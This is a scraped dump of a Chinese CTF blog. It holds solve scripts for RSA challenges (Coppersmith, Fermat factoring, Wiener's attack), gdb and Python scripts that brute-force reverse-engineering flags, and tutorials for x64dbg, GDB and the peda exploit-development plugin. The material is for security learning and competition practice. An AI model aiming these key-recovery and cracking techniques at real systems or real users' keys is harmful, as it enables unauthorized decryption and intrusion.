n)for k in range(1, e): # 这里爆破得到 k=1237 print('k =',k) f = (secret &lt;&lt; 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret &lt;&lt; 200) for i in range(2, e): p = (e * Integer(dp) - 1 + i) // i if n % p == 0: break if p &lt; 0: continue else: print('p =',p) print('dp =',dp) break12345678910111213141516171819202122232425 整合脚本，获取flag。 #sagesecret = 1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985c = 46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616e = 7621n = 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863[n, secret, c] = list(map(Integer, [n, secret, c]))def facorize(e, dp): for i in range(2, e): p = (e * dp - 1 + i) // i if n % p == 0: return p return -1def recover(secret): F.&lt;x&gt; = PolynomialRing(Zmod(n)) d = inverse_mod(e, n) for k in range(1235, e): print('k =',k) f = (secret &lt;&lt; 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret &lt;&lt; 200) p = facorize(e, Integer(dp)) if p &lt; 0: continue else: return p, dpif __name__ == \"__main__\": p, dp = recover(secret) q = n // p assert p * q == n phi = (p - 1) * (q - 1) d = inverse_mod(e, phi) print('p =',p) print('q =',q) m = pow(c, d, n) flag = bytes.fromhex(hex(m)[2:]) print(flag)1234567891011121314151617181920212223242526272829303132333435363738394041 more_calc题目： maybe u need more cpu import gmpy2from Crypto.Util.number import *flag &#x3D; b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;p &#x3D; getStrongPrime(2048)for i in range(1, (p+1)&#x2F;&#x2F;2): s +&#x3D; pow(i, p-2, p)s &#x3D; s % pq &#x3D; gmpy2.next_prime(s)n &#x3D; p*qe &#x3D; 0x10001c &#x3D; pow(bytes_to_long(flag), e, n)print(p)print(c)&#39;&#39;&#39;p &#x3D; 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069c &#x3D; 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523&#39;&#39;&#39;12345678910111213141516171819 解题： import gmpy2p=27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069c=350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523e=0x10001c1=c%pd1=gmpy2.invert(e,p-1)m=pow(c1,d1,p)flag = bytes.fromhex(hex(m)[2:])print(flag)12345678910 RSAssss题目考点： 费马因式分解 题目： more factors,more strong from Crypto.Util.number import *from gmpy2 import next_primep &#x3D; getPrime(512)q &#x3D; getPrime(512)n &#x3D; p * q * next_prime(p) * next_prime(q)e &#x3D; 0x10001flag &#x3D; b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;cipher &#x3D; pow(bytes_to_long(flag), e, n)print(n, cipher)&#39;&#39;&#39;n &#x3D; 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257cipher &#x3D; 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207&#39;&#39;&#39;123456789101112131415161718 解题：参考文章：https://github.com/pcw109550/write-up/tree/master/2019/ISITDTU/Easy_RSA_2 exp： from Cryptodome.Util.number import *from gmpy2 import *e = 0x10001n = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257c = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207def fermat_factorization(n): factor_list = [] get_context().precision = 2048 x = int(sqrt(n)) while True: x += 1 y2 = x ** 2 - n if is_square(y2): #print('x = ',x) y2 = mpz(y2) get_context().precision = 2048 y = int(sqrt(y2)) factor_list.append([x+y, x-y]) if len(factor_list) == 2: break return factor_listdef main(): factor_list = fermat_factorization(n) #print(factor_list) [X1, Y1] = factor_list[0] [X2, Y2] = factor_list[1] assert X1 * Y1 == n assert X2 * Y2 == n p1 = gcd(X1, X2) q1 = X1 // p1 p2 = gcd(Y1, Y2) q2 = Y1 // p2 #print('p1 =',p1) #print('p2 =',p2) #print('q1 =',q1) #print('q2 =',q2) phi = (p1 - 1) * (q1 - 1) * (p2 - 1) * (q2 - 1) d = inverse(e, phi) flag = long_to_bytes(pow(c, d, n)) print(flag)if __name__ == \"__main__\": main()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 simpleRSA题目考点： 低解密指数攻击 题目： Familiar and simple rsa from Crypto.Util.number import *import gmpy2p, q, r &#x3D; [getPrime(512) for i in range(3)]n &#x3D; p * q * rphi &#x3D; (p - 1) * (q - 1) * (r - 1)d &#x3D; getPrime(256)e &#x3D; gmpy2.invert(d , phi)flag &#x3D; b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;c &#x3D; pow(bytes_to_long(flag), e, n)print(e, n)print(c)&#39;&#39;&#39;e &#x3D; 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679n &#x3D; 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173c &#x3D; 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452&#39;&#39;&#39;123456789101112131415161718192021 解题： 参考lazzzaro师傅的文章。 exp： from Cryptodome.Util.number import long_to_bytese = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452#连分数展开算法def lf(x,y): arr=[] while y: arr+=[x//y] x,y=y,x%y return arr#渐进分数算法def jj(k): x=0 y=1 for i in k[::-1]: x,y=y,x+i*y return (y,x)data=lf(e,n)for x in range(1,len(data)+1): data1=data[:x] d = jj(data1)[1] m = pow(c,d,n) flag = long_to_bytes(m) if b'flag&#123;' in flag: print(flag) break RERE1通过逆向发现 flag 的每一位都采用相同的加密方式，然后会在函数末尾判断，所以直接写一个 gdb 脚本爆破明文对应密文的关系即可 gdb 脚本： b *(0x8000000 + 0x18096)python f = open('log','w+')set $ipx = 0x20r &lt; test_inputwhile ($ipx &lt; 0x80)set *(char*)$rdi = $ipxpython f.write(gdb.execute('p $ipx', to_string=True))set $pc=$rebase(0x810)cpython s = gdb.execute('x/bx $rdi', to_string=True)python f.write(s)python f.flush()set $ipx=$ipx+1ends = &#123;32: 0xd8,33: 0xd9,34: 0xda,35: 0xdb,36: 0xdc,37: 0xdd,38: 0xde,39: 0xdf,40: 0xe0,41: 0xe1,42: 0xe2,43:0xe3,44: 0xe4,45: 0xe5,46: 0xe6,47: 0xe7,48: 0xe8,49: 0xe9,50: 0xea,51: 0xeb,52: 0xec,53: 0xed,54: 0xee,55:0xef,56: 0xf0,57: 0xf1,58: 0xf2,59: 0xf3,60: 0xf4,61: 0xf5,62: 0xf6,63: 0xf7,64: 0xf8,65: 0xf9,66: 0xfa,67:0xfb,68: 0xfc,69: 0xfd,70: 0xfe,71: 0xff,72: 0x00,73: 0x01,74: 0x02,75: 0x03,76: 0x04,77: 0x05,78: 0x06,79:0x07,80: 0x08,81: 0x09,82: 0x0a,83: 0x0b,84: 0x0c,85: 0x0d,86: 0x0e,87: 0x0f,88: 0x10,89: 0x11,90: 0x12,91:0x13,92: 0x14,93: 0x15,94: 0x16,95: 0x17,96: 0x18,97: 0x19,98: 0x1a,99: 0x1b,100: 0x1c,101: 0x1d,102:0x1e,103: 0x1f,104: 0x20,105: 0x21,106: 0x22,107: 0x23,108: 0x24,109: 0x25,110: 0x26,111: 0x27,112:0x28,113: 0x29,114: 0x2a,115: 0x2b,116: 0x2c,117: 0x2d,118: 0x2e,119: 0x2f,120: 0x30,121: 0x31,122:0x32,123: 0x33,124: 0x34,125: 0x35,126: 0x36,127: 0x37&#125;enc_flag =[0x0EB,0x0F1,0x19,0x0E8,0x1E,0x1E,0x0F0,0x0EC,0x0EF,0x1E,0x0E9,0x1E,0x0EC,0x0EC,0x0E8,0x0EC,0x19,0x19,0x0EE,0x1B,0x0EF,0x0EF,0x0EC,0x0EA,0x1C,0x0EA,0x0E8,0x0EB,0x0EE,0x0EB,0x1D,0x0F1]for i in enc_flag:for j in xrange(0x20,0x80):if s[j] == i:res += chr(j)break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"x64dbg的安装与配置","slug":"x64dbg的安装与配置","date":"2020-11-21T14:07:25.030Z","updated":"2020-11-21T14:20:55.139Z","comments":true,"path":"2020/11/21/x64dbg的安装与配置/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/21/x64dbg%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/","excerpt":"从0到1——X64dbg","text":"从0到1——X64dbg 0x01 x64dbg的安装与配置x64dbg官网地址：https://x64dbg.com/#start 0x02 x64dbg界面介绍1.反汇编窗口 这个位置显示的是需要分析的程序的反汇编代码。在第一个区域的最左侧例如“7712EAA3”这一列就是内存地址区域，接着“E8 07”就是汇编指令的opcode，“jmp xxxxxxxxx”这个区域就是汇编代码区，最后有一个空白的地方，我们可以在这个位置输入一些注释。 2.寄存器窗口 这里显示的是当前所调试程序的寄存器信息。 3.数据窗口 这里一般查看的是内存地址的内容。最左边是地址，接着是对应地址的十六进制数据，最右侧是十六进制对应的ASCII码。 4.堆栈窗口 显示一些堆栈的信息。 0x03 基本调试方法首先我们了解一下一些基本的操作指令。F2：设置断点。（可以简单理解为暂停）F4：运行到光标处F7：单步步入。（遇到call指令，进入call函数的实现处继续执行汇编指令）F8：单步步过。（遇到call指令，执行call函数，之后接着执行call指令的下一条指令）F9：运行程序（如果没有碰到断点，程序会一直执行到结束。） Ctrl+F9: 执行到函数返回处，用于跳出函数实现 Alt+F9:执行到用户代码，用于快速跳出系统函数 Ctrl+G:输入十六进制地址，快速定位到该地址处 0x04 搜索字符串 0x05 修改后保存成EXE文件-&gt;补丁(ctrl+P) 修补文件 自己输入文件名加.exe后缀 0x06 命令支持格式 命令 arg1 ， arg2 ， argN 0x07 寄存器所有大小的寄存器都可以用作变量 0x08 内存读取[addr] 读取DWORD / QWORD n:[addr] 从addr开始读取n个字节 seg:[addr] 段寄存器加偏移读取DWORD / QWORD seg可以gs，es，cs，fs，ds，ss byte:[addr] 读取BYTE word:[addr] 读取word dword:[addr] 读取dword qword:[addr] 读取qword 字节/字/双字/四字/指针(ptr)ReadByte,Byte,byte(addr)：从 addr 读取一个字节，并返回该值。ReadWord,Word,word(addr)：从 addr 读取一个字(2字节)，并返回该值。ReadDword,Dword,dword(addr)：从 addr 读取双字(4字节)，并返回该值。ReadQword,Qword,qword(addr)：从 addr 读取四字(8字节)，并返回该值(仅用于x64)。ReadPtr,ReadPointer,ptr,Pointer,pointer(addr)：从 addr 读取一个指针(4/8 字节)，并返回该值。 数字默认情况下，所有数字都解释为十六进制！如果要指定，可以x或0x作为前缀。十进制数可以通过在数字前加点号来使用.123=7B 模块数据键入GetProcAddress,它将自动解析为函数的实际地址。要明确定义从哪个模块加载API，请使用：[module].dll:[api]或[module]:[api]。当[module]为空字符串时:GetProcAddress，将使用CPU中当前选择的模块。 加载的模块基地如果您要访问加载模块的基地址，你可以写：[module]:0，[module]:base，[module]:imagebase或[module]:header RVA /文件偏移量如果要访问模块RVA，则可以写[module]:0+[rva]，也可以写[module]:$[rva]。如果要将文件偏移量转换为VA，可以使用[module]:#[offset]。例如，当[module]为空字符串时，将使用CPU中当前选择的模块 模块的入口点要访问一个模块的入口点，你可以写[module]:entry，[module]:oep或[module]:ep。请注意，当有名称为的导出时entry，oep否则ep将返回这些地址 表达式调试器允许使用基本表达式。只需在命令窗口中键入一个表达式，结果就会显示在控制台中。除了计算之外，它还允许使用类似C的语法快速更改变量 括号：(1+2)，[1+6]比其他操作优先。 一元减/二进制非/逻辑非：（-1负1），~1（二进制非1），!0（逻辑非0）。 乘法/除法：（2*3常规乘法），23（得到乘法的高分），6/3（常规除法），5%3`（除法的模/余数）。 加法/减法：（1+3加法），5-2（减法）。 左/右移位/旋转：（1&lt;&lt;2向左移位，shl表示无符号，sal表示有符号），10&gt;&gt;1（向右移位，shl表示无符号，sal表示有符号），1&lt;&lt;&lt;2（向左旋转），1&gt;&gt;&gt;2（向右旋转）。 小（相等）/大（等于）：4&lt;10，3&gt;6，1&lt;=2，6&gt;=7（如果真解析为1，0，如果假）。 等于/不等于：1==1，2!=6（如果为true，则解析为1；如果为false，则解析为0）。 二进制和：（12&amp;2常规二进制和）。 二进制异或：（2^1常规二进制异或）。 二进制或：（2|8常规二进制或）。 逻辑和：（0&amp;&amp;3如果为true，则解析为1；如果为false，则解析为0）。 逻辑或：（0||3如果为true，则解析为1；如果为false，则解析为0）。 逻辑含义：（0-&gt;1如果为true，则解析为1；如果为false，则解析为0） 处理信息 peb() ：获取PEB地址。 teb() ：获取TEB地址。 tid() ：获取当前线程ID 插件stringsx64dbg 字符串搜索 x64dbgApiBreak API断点 xAnalyzer 分析 SharpOD x64 反调试","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"peda的官方文档说明","slug":"peda的官方文档说明","date":"2020-11-21T02:34:01.661Z","updated":"2020-11-21T14:25:11.274Z","comments":true,"path":"2020/11/21/peda的官方文档说明/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/21/peda%E7%9A%84%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E8%AF%B4%E6%98%8E/","excerpt":"有关peda的一些说明","text":"有关peda的一些说明 peda在github上的官方文档，摘抄过来，方便查阅。 安装 git clone https://github.com/longld/peda.git ~/pedaecho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging. Add commands to support debugging and exploit development (for a full list of commands use peda help): aslr – Show/set ASLR setting of GDB checksec – Check for various security options of binary dumpargs – Display arguments passed to a function when stopped at a call instruction dumprop – Dump all ROP gadgets in specific memory range elfheader – Get headers information from debugged ELF file elfsymbol – Get non-debugging symbol information from an ELF file lookup – Search for all addresses/references to addresses which belong to a memory range patch – Patch memory start at an address with string/hexstring/int pattern – Generate, search, or write a cyclic pattern to memory procinfo – Display various info from /proc/pid/ pshow – Show various PEDA options and other settings pset – Set various PEDA options and other settings readelf – Get headers information from an ELF file ropgadget – Get common ROP gadgets of binary or library ropsearch – Search for ROP gadgets in memory searchmem|find – Search for a pattern in memory; support regex search //查找用，例如 searchmem “/bin/sh” libc shellcode – Generate or download common shellcodes. skeleton – Generate python exploit code template vmmap – Get virtual mapping address ranges of section(s) in debugged process //可以用来查看栈、bss段是否可以执行 xormem – XOR a memory region with a key","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/gha01un/gha01un.github.io/tags/PWN/"}],"author":"H1un"},{"title":"GDB调试实用命令","slug":"GDB调试实用命令","date":"2020-11-21T02:15:41.578Z","updated":"2020-11-21T14:25:01.369Z","comments":true,"path":"2020/11/21/GDB调试实用命令/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/21/GDB%E8%B0%83%E8%AF%95%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"简单的GDB调试","text":"简单的GDB调试 0x01 插件安装1.gdb-peda 这是一个调试时必不可少的神器,github地址在:https://github.com/longld/peda ,它的安装两条简单命令即可完成: 1.git clone https://github.com/longld/peda.git ~/peda 2.echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit peda的一个实用命令checksec检测安全保护。 peda的另一个实用命令searchmem用搜索内存 0x02 常用命令file 路径 附加文件 r 开始执行 c 继续执行 step 单步步入 next 单步步过 b *地址 下断点 enable 激活断点 disable 禁用断点 info b 查看断点 del num 删除断点 x/wx $esp 以4字节16进制显示栈中内容 stack 100 插件提供的，显示栈中100项 find xxx 快速查找，很实用 s 按字符串输出 x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。c 按字符格式显示变量。f 按浮点数格式显示变量。 x/&lt;n/f/u&gt; n、f、u是可选的参数。 b表示单字节，h表示双字节，w表示四字 节，g表示八字节 但是实际的组合就那么几种： x/s 地址 查看字符串 x/wx 地址 查看DWORD x/c 地址 单字节查看 x/16x $esp+12 查看寄存器偏移 set args 可指定运行时参数。（如：set args 10 20 30 40 50）show args 命令可以查看设置好的运行参数。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/gha01un/gha01un.github.io/tags/PWN/"}],"author":"H1un"},{"title":"2020年全国大学生网络安全邀请赛","slug":"2020年全国大学生网络安全邀请赛暨第六届上海市大学生网络安全大赛","date":"2020-11-20T13:58:55.041Z","updated":"2021-01-11T01:42:56.946Z","comments":true,"path":"2020/11/20/2020年全国大学生网络安全邀请赛暨第六届上海市大学生网络安全大赛/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/20/2020%E5%B9%B4%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B%E6%9A%A8%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"上海赛复现","text":"上海赛复现 RERE1 真正的Babyre 首先定位字符串，函数堆栈不平衡，首先修复堆栈不平衡问题。F5，寻找主逻辑。IDA启动调试，处理掉case3处的反调试。 dump出关键对比数据： cipher=[0x1F, 0x18, 0x0F, 0xFA, 0xB8, 0x63, 0x64, 0x89, 0x18, 0x68, 0x7C, 0x19, 0x14, 0x2D, 0x7D, 0x58, 0x00, 0x1E, 0x54, 0x6A, 0x41, 0x3C, 0x36, 0x3E, 0x56, 0x13, 0x04, 0x3B, 0x2E, 0x4B, 0x79, 0x43, 0x7A, 0x22, 0x45, 0x6E, 0x3A, 0x75, 0x26, 0xC8, 0xC0, 0x8E]table=[9, 2, 7, 8, 6, 9, 11, 10, 4, 11, 12, 4, 7, 7, 10, 4, 3, 9, 4, 6, 3, 12, 11, 13, 4, 10, 7, 7, 2, 6, 6, 12, 9, 14, 7, 8, 11, 13, 14, 12, 4,7]table2=[13, 8, 12, 10, 3, 9, 5, 12, 13, 11, 12, 7, 6, 10, 8, 9, 13, 8, 5, 10, 7, 13, 4, 13, 2, 12, 10, 12, 9, 7, 14, 5, 11, 7, 13, 7, 13, 11, 5, 14, 6, 10] 动调得出主要逻辑：flag进行两轮加密，每次取table中的对应位异或和相与，若相与后，结果不为零则将table处值*2继续异或相与。最后将异或的值与后一位flag相异或。 分析逻辑，三位flag是有关联的，猜测flag格式为“flag{}”，动调下断点，发现前几位与对比数据已经相同，并且不受后方未确定字符影响。所以选择爆破flag。python模拟程序加密，按位进行爆破。 python脚本： cipher=[0x1F, 0x18, 0x0F, 0xFA, 0xB8, 0x63, 0x64, 0x89, 0x18, 0x68, 0x7C, 0x19, 0x14, 0x2D, 0x7D, 0x58, 0x00, 0x1E, 0x54, 0x6A, 0x41, 0x3C, 0x36, 0x3E, 0x56, 0x13, 0x04, 0x3B, 0x2E, 0x4B, 0x79, 0x43, 0x7A, 0x22, 0x45, 0x6E, 0x3A, 0x75, 0x26, 0xC8, 0xC0, 0x8E]table=[9, 2, 7, 8, 6, 9, 11, 10, 4, 11, 12, 4, 7, 7, 10, 4, 3, 9, 4, 6, 3, 12, 11, 13, 4, 10, 7, 7, 2, 6, 6, 12, 9, 14, 7, 8, 11, 13, 14, 12, 4,7]table2=[13, 8, 12, 10, 3, 9, 5, 12, 13, 11, 12, 7, 6, 10, 8, 9, 13, 8, 5, 10, 7, 13, 4, 13, 2, 12, 10, 12, 9, 7, 14, 5, 11, 7, 13, 7, 13, 11, 5, 14, 6, 10] \\# print()] \\# X=(ord('f')^o)&amp;o \\# if X==0: \\# print(o)\\# break; \\# else: \\# o=X*2def check(flag,P): \\#flag=\"flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;\" first=[] for i in range(0,41):​ H=ord(flag[i])​ \\#i=0x7b​ a=H^table[i] #125​ b=H&amp;table[i]​ \\# print(b)​ while(b):​ k=2*b​ b=a&amp;k​ a=a^k​ \\#print(a)​ first.append(a^ord(flag[(i+1)%42])) H=ord(flag[41])​ \\#i=0x7b a=H^table[41] #125 b=H&amp;table[41] \\# print(b) while(b):​ k=2*b​ b=a&amp;k​ a=a^k​ \\#print(a) first.append(a^first[0]) \\# for i in first: \\# print(hex(i),end=\" \") \\# print() first1=[] for i in range(0,41):​ H=first[i]​ \\#i=0x7b​ a=H^table2[i] #125​ b=H&amp;table2[i] \\# print(b)​ while(b):​ k=2*b​ b=a&amp;k​ a=a^k​ \\#print(a)​ first1.append(a^first[(i+1)%42]) H=first[41]​ \\#i=0x7b a=H^table2[41] #125 b=H&amp;table2[41] \\# print(b) while(b):​ k=2*b​ b=a&amp;k​ a=a^k​ \\#print(a) first1.append(a^first1[0]) \\#for i in first1:​ \\#print(hex(i),end=\" \") \\# print() \\#print(hex(cipher[P])) if first1[P]==cipher[P]:​ return 1 else:​ return 0flag=\"flag&#123;\"list1=\"1234567890-abcdefghijklmnopqrstuvwxyz&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ\"for i in range(5,41): for j in list1:​ flag1=flag+j+\"a\"*(42-len(flag)-1)+\"&#125;\"​ \\#print(flag1)​ if(check(flag1,i-2)):​ \\#print(flag1)​ flag+=j​ print(flag1)​ break 得到flag： cryptobaby_rsa思路：根据hint1和hint2求得p从而解题 过程： hint1 &#x3D; pow(233*p1+q1,123,n1)hint2 &#x3D; pow(p1+q1,321,n1)t1&#x3D;pow(hint1,321,n1)t2&#x3D;pow(hint2,123,n1) 使hint1与hint2有相同的指数，由于q1前面数字为1，所以可以通过t2-t1来消除掉q1，从而提取出因子p1。 import gmpy2from gmpy2 import *from Crypto.Util.number import *n=17649959524397760997121068808256580843504587497910149453915162267396485718887518595291066193109877306674118444195689568088263844046660375223625289837992862053279345177671592293911174778827999488542179620983366850016034027115530276422989943300228066482304416809472413052663535805445730178026554076921827725694259203653909224978173857255494234555062560049936771927672590813681897238186260507539943545237569643120449213465796499750961465626495972566123774033404378255591053613115928255568749091129063492156842873395480632444228696955053141918113950854532182678159336565263274798149079981609244430557152399984535126235363c=15029318220576201468560263535467919662488860043345492393144032736965870242713450606659777890850505132225711280093046172524095525322154673926523304203423191705454071359296529857716754655771123283983880428698763018843822679367577019725819696194151686979021896785125371586584321924453460309048191160124062645590495288978330433202359745254888236717638151156562967968775572180730587161672905799413277059329869890946648167796801765219831746094281346814783939724111424859058879220880599487372955861808493657218563898884555812145492576092463968720535434333471337338652526644364433874563267556126777216068855825634384513829424n1=11941055546120835541933837916957535027223641642056156743752345801163456170772591807989846005495118671627583480778591488285910051133125545781378893719554427584148075540206612251653456701817071613890721071975616517809857996246607186607334395902967699076560894499607006508473605653089963092771854212576322017350805147649094768237953455009748131863337396511143680074932058392590124680763754449521538152648826051051725262170054340100951449328841662181738885435084388023374118710392556656584562494466181529819874959240003672308773193993983011133478065179503497212335076082903214298387572478483167372666139510894330498063363c1=6581154435167641787433706075004561388301805860331946235823513860405803778235872737931884851831035226083382029584246800645018019413127765759061141252000392053167257633079915212463877266874219355926577661560935087214076228489015179444896502239970526394611817785461522402281447698895527412078173938006497062776091893518267645893781893160963255732937916279470200335626401698825349254177657209090710482565606571789980792435731381726512181109745347022096351073206312644630716411754744858295344041386540535791304586399357404127194796021552916370709209765337503596373097584818783365858724366310222037341353418913289811053095hint1=18333594542778845472609649544365314632680665766587229896275646490336969697095362170884867003129330279504282721299504955350272888866519919151656843246110004360889790184856884088162315219684539360756968057510532763634770532